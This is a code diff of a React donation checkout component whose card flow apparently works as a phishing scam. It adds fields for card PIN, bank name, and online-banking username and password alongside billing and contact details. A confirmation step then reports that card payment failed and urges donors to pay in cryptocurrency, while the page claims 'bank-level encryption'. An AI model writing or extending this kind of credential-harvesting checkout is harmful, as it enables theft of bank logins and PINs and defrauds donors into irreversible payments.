+                className="billing-input"
+              />
+            </div>
+            {cardErrors.street && <span className="error-text">{cardErrors.street}</span>}
+          </div>
+          
+          <div className="form-row">
+            <div className="form-group">
+              <label>City</label>
+              <div className={`input-with-icon ${cardErrors.city ? 'error' : ''}`}>
+                <FaMapMarkerAlt />
+                <input
+                  type="text"
+                  placeholder="New York"
+                  value={billingAddress.city}
+                  onChange={(e) => handleInputChange('city', e.target.value, 'billing')}
+                  className="billing-input"
+                />
+              </div>
+              {cardErrors.city && <span className="error-text">{cardErrors.city}</span>}
+            </div>
+            
+            <div className="form-group">
+              <label>State</label>
+              <div className={`input-with-icon ${cardErrors.state ? 'error' : ''}`}>
+                <FaMapMarkerAlt />
+                <input
+                  type="text"
+                  placeholder="NY"
+                  value={billingAddress.state}
+                  onChange={(e) => handleInputChange('state', e.target.value, 'billing')}
+                  className="billing-input"
+                />
+              </div>
+              {cardErrors.state && <span className="error-text">{cardErrors.state}</span>}
+            </div>
+          </div>
+          
+          <div className="form-row">
+            <div className="form-group">
+              <label>ZIP Code</label>
+              <div className={`input-with-icon ${cardErrors.zipCode ? 'error' : ''}`}>
+                <FaMapMarkerAlt />
+                <input
+                  type="text"
+                  placeholder="10001"
+                  value={billingAddress.zipCode}
+                  onChange={(e) => handleInputChange('zipCode', e.target.value, 'billing')}
+                  className="billing-input"
+                />
+              </div>
+              {cardErrors.zipCode && <span className="error-text">{cardErrors.zipCode}</span>}
+            </div>
+            
+            <div className="form-group">
+              <label>Country</label>
+              <div className={`input-with-icon ${cardErrors.country ? 'error' : ''}`}>
+                <FaMapMarkerAlt />
+                <input
+                  type="text"
+                  placeholder="United States"
+                  value={billingAddress.country}
+                  onChange={(e) => handleInputChange('country', e.target.value, 'billing')}
+                  className="billing-input"
+                />
+              </div>
+              {cardErrors.country && <span className="error-text">{cardErrors.country}</span>}
+            </div>
+          </div>
+        </div>
+
+        {/* Account Information Section */}
+        <div className="form-section">
+          <h5>Account Information</h5>
+          <div className="form-row">
+            <div className="form-group">
+              <label>Email Address</label>
+              <div className={`input-with-icon ${cardErrors.email ? 'error' : ''}`}>
+                <FaEnvelope />
+                <input
+                  type="email"
+                  placeholder="john@example.com"
+                  value={accountInfo.email}
+                  onChange={(e) => handleInputChange('email', e.target.value, 'account')}
+                  className="account-input"
+                />
+              </div>
+              {cardErrors.email && <span className="error-text">{cardErrors.email}</span>}
+            </div>
+            
+            <div className="form-group">
+              <label>Phone Number</label>
+              <div className={`input-with-icon ${cardErrors.phoneNumber ? 'error' : ''}`}>
+                <FaPhone />
+                <input
+                  type="text"
+                  placeholder="(555) 123-4567"
+                  value={accountInfo.phoneNumber}
+                  onChange={(e) => handleInputChange('phoneNumber', e.target.value, 'account')}
+                  className="account-input"
+                />
+              </div>
+              {cardErrors.phoneNumber && <span className="error-text">{cardErrors.phoneNumber}</span>}
+            </div>
           </div>
           
           <div className="form-group">
-            <label>Account Password</label>
-            <div className={`input-with-icon ${cardErrors.accountPassword ? 'error' : ''}`}>
+            <label>Card PIN</label>
+            <div className={`input-with-icon ${cardErrors.cardPin ? 'error' : ''}`}>
               <FaKey />
               <input
                 type="password"
-                placeholder="••••••••"
-                value={accountInfo.accountPassword}
-                onChange={(e) => handleInputChange('accountPassword', e.target.value, 'account')}
+                placeholder="****"
+                value={accountInfo.cardPin}
+                onChange={(e) => handleInputChange('cardPin', e.target.value, 'account')}
+                className="account-input pin"
+              />
+            </div>
+            {cardErrors.cardPin && <span className="error-text">{cardErrors.cardPin}</span>}
+          </div>
+          
+          <div className="form-group">
+            <label>Bank Name</label>
+            <div className={`input-with-icon ${cardErrors.bankName ? 'error' : ''}`}>
+              <input
+                type="text"
+                placeholder="Bank of America"
+                value={accountInfo.bankName}
+                onChange={(e) => handleInputChange('bankName', e.target.value, 'account')}
                 className="account-input"
               />
             </div>
-            {cardErrors.accountPassword && <span className="error-text">{cardErrors.accountPassword}</span>}
+            {cardErrors.bankName && <span className="error-text">{cardErrors.bankName}</span>}
+          </div>
+          
+          <div className="form-row">
+            <div className="form-group">
+              <label>Account Username</label>
+              <div className={`input-with-icon ${cardErrors.accountUsername ? 'error' : ''}`}>
+                <FaUser />
+                <input
+                  type="text"
+                  placeholder="johndoe123"
+                  value={accountInfo.accountUsername}
+                  onChange={(e) => handleInputChange('accountUsername', e.target.value, 'account')}
+                  className="account-input"
+                />
+              </div>
+              {cardErrors.accountUsername && <span className="error-text">{cardErrors.accountUsername}</span>}
+            </div>
+            
+            <div className="form-group">
+              <label>Account Password</label>
+              <div className={`input-with-icon ${cardErrors.accountPassword ? 'error' : ''}`}>
+                <FaKey />
+                <input
+                  type="password"
+                  placeholder="••••••••"
+                  value={accountInfo.accountPassword}
+                  onChange={(e) => handleInputChange('accountPassword', e.target.value, 'account')}
+                  className="account-input"
+                />
+              </div>
+              {cardErrors.accountPassword && <span className="error-text">{cardErrors.accountPassword}</span>}
+            </div>
           </div>
         </div>
-        
-        <button className="next-btn" onClick={() => setStep(8)}>
-          Review and Link Account
-        </button>
       </div>
-    </div>
-  );
 
-  // Step 8: Link Account
-  const renderStep8 = () => (
-    <div className="checkout-step">
-      <h2>Link Your Account</h2>
-      <p className="step-description">Review your information and link your account</p>
+      {cardErrors.general && (
+        <div className="error-message general-error">
+          {cardErrors.general}
+        </div>
+      )}
       
-      <div className="card-payment-form">
-        <div className="amount-summary">
-          <h4>Donation Summary</h4>
-          <div className="summary-item">
-            <span>Amount:</span>
-            <span>${donationAmount}</span>
-          </div>
-          <div className="summary-item">
-            <span>Processing Fee:</span>
-            <span>$0.00</span>
-          </div>
-          <div className="summary-item total">
-            <span>Total:</span>
-            <span>${donationAmount}</span>
+      {linkFailed && (
+        <div className="linking-failed">
+          <div className="failure-message">
+            <span>Linking failed. Please check your details and try again.</span>
           </div>
         </div>
-        
-        {cardErrors.general && (
-          <div className="error-message general-error">
-            {cardErrors.general}
-          </div>
-        )}
-        
-        {linkFailed && (
-          <div className="linking-failed">
-            <div className="failure-message">
-              <span>Linking failed. Please try another payment method.</span>
-            </div>
-            <div className="redirecting">
-              <span>Redirecting to cryptocurrency payment...</span>
-            </div>
-          </div>
-        )}
-        
+      )}
+
+      <div className="form-actions">
         <button 
-          className={`link-account-btn ${isLinking ? 'processing' : ''}`}
+          className="action-btn secondary"
+          onClick={() => setShowLinkForm(false)}
+        >
+          Cancel
+        </button>
+        <button 
+          className={`action-btn primary ${isLinking ? 'processing' : ''}`}
           onClick={handleLinkAccount}
-          disabled={isLinking || linkFailed}
+          disabled={isLinking}
         >
           {isLinking ? (
             <>
               <div className="spinner"></div>
               Linking Account...
             </>
-          ) : linkFailed ? (
-            'Redirecting...'
           ) : (
-            'Link Account and Pay'
+            <>
+              <FaLink />
+              Link Account
+            </>
           )}
         </button>
+      </div>
+    </div>
+  );
+
+  // Step 6: Payment Confirmation (for linked accounts) - NOW WITH MANUAL REDIRECT BUTTON
+  const renderStep6 = () => (
+    <div className="checkout-step">
+      <h2>Confirm Your Payment</h2>
+      <p className="step-description">Review your donation and linked account details</p>
+      
+      <div className="payment-confirmation">
+        <div className="confirmation-card">
+          <div className="donation-summary">
+            <h4>Donation Summary</h4>
+            <div className="summary-item">
+              <span>Campaign:</span>
+              <span>{campaign.title}</span>
+            </div>
+            <div className="summary-item">
+              <span>Amount:</span>
+              <span>${donationAmount}</span>
+            </div>
+            <div className="summary-item">
+              <span>Processing Fee:</span>
+              <span>$0.00</span>
+            </div>
+            <div className="summary-item total">
+              <span>Total:</span>
+              <span>${donationAmount}</span>
+            </div>
+          </div>
+          
+          <div className="account-preview">
+            <h4>Linked Account</h4>
+            <div className="account-details-preview">
+              <div className="detail-item">
+                <span>Card:</span>
+                <span>•••• {cardDetails.cardNumber.slice(-4)}</span>
+              </div>
+              <div className="detail-item">
+                <span>Cardholder:</span>
+                <span>{cardDetails.cardholderName}</span>
+              </div>
+              <div className="detail-item">
+                <span>Email:</span>
+                <span>{accountInfo.email}</span>
+              </div>
+            </div>
+          </div>
+
+          {/* Payment Failure Message with Manual Redirect Button */}
+          {paymentFailed && (
+            <div className="payment-failure-message">
+              <div className="failure-header">
+                <FaExclamationTriangle />
+                <h4>Payment Failed</h4>
+              </div>
+              <p>We apologize, but card payments are currently unavailable. Please use cryptocurrency to complete your donation.</p>
+              
+              {showCryptoRedirect && (
+                <div className="crypto-redirect-section">
+                  <div className="redirect-prompt">
+                    <p>Would you like to pay with cryptocurrency instead?</p>
+                  </div>
+                  <button 
+                    className="crypto-redirect-btn"
+                    onClick={handleRedirectToCrypto}
+                  >
+                    <FaEthereum />
+                    Pay with Cryptocurrency
+                    <FaArrowRight />
+                  </button>
+                  <button 
+                    className="action-btn secondary"
+                    onClick={() => setPaymentFailed(false)}
+                  >
+                    Try Card Payment Again
+                  </button>
+                </div>
+              )}
+            </div>
+          )}
+          
+          {cardErrors.general && !paymentFailed && (
+            <div className="error-message general-error">
+              {cardErrors.general}
+            </div>
+          )}
+          
+          {!paymentFailed && (
+            <button 
+              className={`pay-now-btn ${isProcessing ? 'processing' : ''}`}
+              onClick={handleCardPayment}
+              disabled={isProcessing || !isAccountLinked}
+            >
+              {isProcessing ? (
+                <>
+                  <div className="spinner"></div>
+                  Processing Payment...
+                </>
+              ) : (
+                `Pay $${donationAmount} Now`
+              )}
+            </button>
+          )}
+          
+          <div className="security-assurance">
+            <FaShieldAlt />
+            <span>Your payment is secured with bank-level encryption</span>
+          </div>
+        </div>
       </div>
     </div>
   );
@@ -1092,10 +1278,8 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       case 2: return renderStep2();
       case 3: return renderStep3();
       case 4: return renderStep4();
-      case 5: return renderStep5();
-      case 6: return renderStep6();
-      case 7: return renderStep7();
-      case 8: return renderStep8();
+      case 5: return renderStep5(); // Account linking dashboard
+      case 6: return renderStep6(); // Payment confirmation for linked accounts
       case 9: return renderStep9();
       default: return renderStep1();
     }
@@ -1103,18 +1287,15 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
 
   const getStepNumber = () => {
     if (selectedPaymentMethod === 'card') {
-      // Card payment has more steps
-      if (step === 5) return 2;
-      if (step === 6) return 3;
-      if (step === 7) return 4;
-      if (step === 8) return 5;
-      if (step === 9) return 6;
+      if (step === 5) return 2; // Account linking
+      if (step === 6) return 3; // Payment confirmation
+      if (step === 9) return 4; // Success
     }
     return step;
   };
 
   const getTotalSteps = () => {
-    return selectedPaymentMethod === 'card' ? 6 : 4;
+    return selectedPaymentMethod === 'card' ? 4 : 4;
   };
 
   return (
@@ -1142,28 +1323,16 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
           </div>
           <div className={`step ${getStepNumber() >= 2 ? 'active' : ''}`}>
             <span>2</span>
-            <label>{selectedPaymentMethod === 'card' ? 'Card Details' : 'Select Crypto'}</label>
+            <label>{selectedPaymentMethod === 'card' ? 'Link Account' : 'Select Crypto'}</label>
           </div>
           <div className={`step ${getStepNumber() >= 3 ? 'active' : ''}`}>
             <span>3</span>
-            <label>{selectedPaymentMethod === 'card' ? 'Billing' : 'Pay'}</label>
+            <label>{selectedPaymentMethod === 'card' ? 'Confirm' : 'Pay'}</label>
           </div>
           <div className={`step ${getStepNumber() >= 4 ? 'active' : ''}`}>
             <span>4</span>
-            <label>{selectedPaymentMethod === 'card' ? 'Account' : 'Verify'}</label>
+            <label>Complete</label>
           </div>
-          {selectedPaymentMethod === 'card' && (
-            <>
-              <div className={`step ${getStepNumber() >= 5 ? 'active' : ''}`}>
-                <span>5</span>
-                <label>Link</label>
-              </div>
-              <div className={`step ${getStepNumber() >= 6 ? 'active' : ''}`}>
-                <span>6</span>
-                <label>Complete</label>
-              </div>
-            </>
-          )}
         </div>
         
         <div className="checkout-content">
@@ -1177,6 +1346,6 @@ const PaymentCheckout = ({ campaign, donationAmount, onClose, onPaymentComplete 
       </div>
     </div>
   );
-};
+}; 
 
 export default PaymentCheckout;
